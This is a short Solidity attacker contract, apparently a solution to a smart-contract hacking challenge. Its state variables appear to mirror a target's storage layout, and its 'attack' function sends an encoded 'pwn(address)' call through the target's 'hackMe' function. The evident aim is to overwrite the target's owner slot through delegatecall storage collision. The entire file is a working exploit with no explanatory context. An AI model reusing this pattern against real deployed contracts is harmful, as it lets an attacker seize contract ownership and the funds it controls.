// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface ID {
    function hackMe(bytes calldata bites) external returns (bool, bytes memory);
}

contract DAttacker {
    uint256 a = 12345;
    uint8 b = 32;
    string private d;
    uint32 private c;
    string private mot;
    address public owner;
    mapping(address => bool) public canYouHackMe;

    function pwn(address _addr) external {
        owner = _addr;
    }

    function attack(address _Daddress, address _wojak) external {
        bytes memory data = abi.encodeWithSignature("pwn(address)", _wojak);
        ID(_Daddress).hackMe(data);
    }
}
